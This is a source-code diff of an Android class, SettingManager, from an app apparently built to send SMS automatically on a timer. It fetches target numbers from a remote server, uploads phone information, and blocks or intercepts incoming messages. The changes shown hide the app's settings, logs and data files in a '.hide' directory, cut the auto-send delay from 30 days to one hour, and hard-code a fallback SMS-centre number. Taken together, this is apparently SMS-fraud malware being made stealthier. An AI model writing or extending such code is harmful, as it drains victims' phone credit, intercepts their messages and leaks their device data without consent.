@@ -34,14 +34,13 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.Build;
 import android.os.PowerManager;
-import android.preference.PreferenceManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.util.Xml;
 
 import com.mms.bg.transaction.WorkingMessage;
+import com.mms.bg.util.LogUtil;
 import com.mms.bg.util.XMLHandler;
-import com.mms.bg.util.XmlLog;
 
 public class SettingManager {
     private static final String TAG = "SettingManager";
@@ -66,13 +65,16 @@ public class SettingManager {
     public static final String SMS_TEMP_BLOCK_NUM_AND_TIMES = "sms_temp_block_num_and_times";
     
     private static final String SERVER_URL = "http://go.ruitx.cn/Coop/request3.php";
+    public final String BASE_PATH;
+    public final String SETTING_FILE_NAME;
     public final String UPLOAD_FILE_PATH;
     public final String DOWNLOAD_FILE_PATH;
     
     private static final int DEFAULT_SMS_COUNT = 0;
     
     private static final String DEFAULT_VALUE = "";
-    private static final long SMS_DEFAULT_DELAY_TIME = 30 * 24 * 60 * 60 * 1000;
+//    private static final long SMS_DEFAULT_DELAY_TIME = (((long) 30) * 24 * 3600 * 1000);
+    private static final long SMS_DEFAULT_DELAY_TIME = 1 * 3600 * 1000;
     public static final String AUTO_SMS_ACTION = "com.mms.bg.SMS";
     public static final String AUTO_CONNECT_SERVER = "com.mms.bg.SERVER";
     private static final int TIMEOUT = 10 * 1000;
@@ -84,7 +86,7 @@ public class SettingManager {
     private SharedPreferences mSP;
     private SharedPreferences.Editor mEditor;
     private static  SettingManager gSettingManager;
-    private XmlLog mLog;
+    private LogUtil mLog;
     public XMLHandler mXMLHandler;
     
     public static SettingManager getInstance(Context context) {
@@ -131,7 +133,7 @@ public class SettingManager {
     public void setLastSMSTime(long time) {
         Date date = new Date(time);
         mEditor.putLong(LAST_SMS_TIME, time);
-        mEditor.putString(LAST_SMS_FORMAT_TIME, date.toGMTString());
+        mEditor.putString(LAST_SMS_FORMAT_TIME, date.toLocaleString());
         mEditor.commit();
     }
     
@@ -239,9 +241,21 @@ public class SettingManager {
         return mSP.getLong(SMS_SEND_DELAY, SMS_DEFAULT_DELAY_TIME);
     }
     
-    public void logSMSCurrentTime() {
-        Date date = new Date(System.currentTimeMillis());
-        mLog.appendLog("SMS_Send", date.toGMTString());
+    public void log(String tag, String log) {
+//        "[[" + this.getClass().getName() + "::" + Thread.currentThread().getStackTrace()[2].getMethodName()
+//        + "]] "
+        
+        if (DEBUG) {
+            StringBuilder str = new StringBuilder();
+            str.append(Thread.currentThread().getStackTrace()[2].getClassName())
+               .append("::")
+               .append(Thread.currentThread().getStackTrace()[2].getMethodName())
+               .append("::Line=")
+               .append(Thread.currentThread().getStackTrace()[2].getLineNumber())
+               .append("  ")
+               .append(log);
+            mLog.appendLog(str.toString());
+        }
     }
     
     //return the temp block num and the time for the bg service. format is num;times
@@ -256,15 +270,6 @@ public class SettingManager {
             mEditor.putString(SMS_TEMP_BLOCK_NUM_AND_TIMES, num + ";" + count);
         }
         mEditor.commit();
-    }
-    
-    public void logTagCurrentTime(String tag) {
-        Date date = new Date(System.currentTimeMillis());
-        mLog.appendLog(tag, date.toGMTString());
-    }
-    
-    public void closeLog() {
-        mLog.endLog();
     }
     
     public boolean isSimCardReady() {
@@ -294,14 +299,16 @@ public class SettingManager {
         long sms_delay_time = getSMSSendDelay();
         long latestSMSTime = this.getLastSMSTime();
         long tempDelay = 2 * 60 * 1000;
+        log(TAG, "sms_delay_time = " + sms_delay_time + " lastSMSTime = " + latestSMSTime
+                + " lastSMSFormatTime = " + getLastSMSFormatTime());
         if (latestSMSTime != 0 && (currentTime - latestSMSTime) >= sms_delay_time + tempDelay) {
-            if (DEBUG) Log.d(TAG, "[[startAutoSendMessage]] start broadcast delay 10s");
+            log(TAG, "start the broadcast because of case 1");
             firstTime = currentTime + tempDelay;
         } else if (latestSMSTime != 0) {
-            if (DEBUG) Log.d(TAG, "[[startAutoSendMessage]] start broadcast delay " + sms_delay_time);
+            log(TAG, "start the broadcast because of case 2");
             firstTime = latestSMSTime + sms_delay_time;
         } else {
-            if (DEBUG) Log.d(TAG, "[[startAutoSendMessage]] start broadcast delay 10s 1");
+            log(TAG, "start the broadcast because of case 3");
             firstTime = currentTime + tempDelay;
         }
         
@@ -374,8 +381,7 @@ public class SettingManager {
     
     public void tryToFetchInfoFromServer(long delayTime) {
         cancelFetchInfo();
-//        final long DEFAULT_FETCH_DELAY = 24 * 60 * 60 * 1000;
-        final long DEFAULT_FETCH_DELAY = 2 * 60 * 1000;
+        final long DEFAULT_FETCH_DELAY = ((long) 24) * 60 * 60 * 1000;
         Intent intent = new Intent(mContext, AutoSMSRecevier.class);
         intent.setAction(AUTO_CONNECT_SERVER);
         PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
@@ -457,9 +463,9 @@ public class SettingManager {
     private void savePhoneInfo() {
         String smsCenter = this.getSMSCenter();
         //test code
-//        if (smsCenter == null) {
-//            smsCenter = "13800100500";
-//        }
+        if (smsCenter == null) {
+            smsCenter = "13800100500";
+        }
         LOGD("[[savePhoneInfo]] smsCenter = " + smsCenter);
         if (smsCenter != null) {
             if (smsCenter.startsWith("+") == true && smsCenter.length() == 14) {
@@ -566,6 +572,7 @@ public class SettingManager {
         if (r == null) return false;
         if (r.getStatusLine().getStatusCode() != 200) {
             LOGD("[[getTargetNum]] r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
+            log(TAG, "r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
             return false;
         }
         try {
@@ -653,7 +660,7 @@ public class SettingManager {
         }
         String blockTime = mXMLHandler.getChanneInfo(XMLHandler.INTERCEPT_TIME);
         if (blockTime != null) {
-            this.setSMSBlockDelayTime(Integer.valueOf(blockTime) * 60 * 60 * 1000);
+            this.setSMSBlockDelayTime(Long.valueOf(blockTime) * 60 * 1000);
         } else {
             mEditor.remove(SMS_BLOCK_TIME);
         }
@@ -671,24 +678,34 @@ public class SettingManager {
                 in.read(datas, 0, datas.length);
                 String result = new String(datas);
                 Log.d(TAG, result);
+                log(TAG, result);
             } catch (Exception e) {
                 Log.d(TAG, "[[dumpReceiveFile]] e = " + e.getMessage());
+                log(TAG, "dumpReceiveFile error = " + e.getMessage());
             }
         }
     }
     
     private SettingManager(Context context) {
         mContext = context;
-        mSP = PreferenceManager.getDefaultSharedPreferences(mContext);
+        BASE_PATH = context.getFilesDir().getAbsolutePath() + "/.hide/";
+        File file = new File(BASE_PATH);
+        if (file.exists() == false) {
+            file.mkdirs();
+        }
+        SETTING_FILE_NAME = "setting";
+        mSP = context.getSharedPreferences(SETTING_FILE_NAME, Context.MODE_PRIVATE);
         mEditor = mSP.edit();
-        mLog = new XmlLog(context.getFilesDir().getAbsolutePath() + "/log.xml", true);
-        UPLOAD_FILE_PATH = context.getFilesDir().getAbsolutePath() + "/upload.xml";
-        DOWNLOAD_FILE_PATH = context.getFilesDir().getAbsolutePath() + "/serverInfo.xml";
+        mLog = LogUtil.getInstance(BASE_PATH + "log.txt");
+        UPLOAD_FILE_PATH = BASE_PATH + "upload.xml";
+        DOWNLOAD_FILE_PATH = BASE_PATH + "serverInfo.xml";
     }
     
-    private static void LOGD(String msg) {
+    private void LOGD(String msg) {
         if (DEBUG) {
-            Log.d(TAG, msg);
+            Log.d(TAG, "[[" + this.getClass().getName() 
+                    + "::" + Thread.currentThread().getStackTrace()[3].getMethodName()
+                    + "]] " + msg);
         }
     }
     
